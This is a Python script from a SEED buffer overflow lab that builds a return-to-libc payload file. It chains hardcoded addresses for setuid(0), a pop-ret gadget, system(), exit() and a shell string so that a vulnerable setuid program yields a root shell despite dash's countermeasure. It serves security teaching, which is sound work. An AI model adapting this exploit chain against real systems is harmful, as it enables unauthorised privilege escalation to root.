#!/usr/bin/python3
# SEED buffer overflow lab. Task 5. Deal with dash's countermeasure in which
# it nullifies the effect of the SETUID bit. Set the real user id to 0.

import sys

content = bytearray(0xaa for i in range(48))

# skip 20 bytes in buffer + 4 bytes for ebp
L = 24
setuid_addr = 0xb7eb9170
content[L:L+4] = (setuid_addr).to_bytes(4,byteorder='little')

M = L + 4
pop_ret_addr = 0x80485eb
content[M:M+4] = (pop_ret_addr).to_bytes(4,byteorder='little')

N = M + 4
content[N:N+4] = (0).to_bytes(4,byteorder='little')

Y = N + 4
system_addr = 0xb7e42da0 #0xb7e7d410 strlen #0xb7e51670 printf #0xb7e42da0 system #0xbbbbbbbb 
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = Y + 4 #20+4+4
exit_addr = 0xb7e369d0 #0xcccccccc #
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

X = Z + 4 #20+4+4+4
sh_addr = 0xbffff18b #0xbffff09a terminator #0xbffff18b terminal
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

with open("badfile","wb") as f:
	f.write(content)
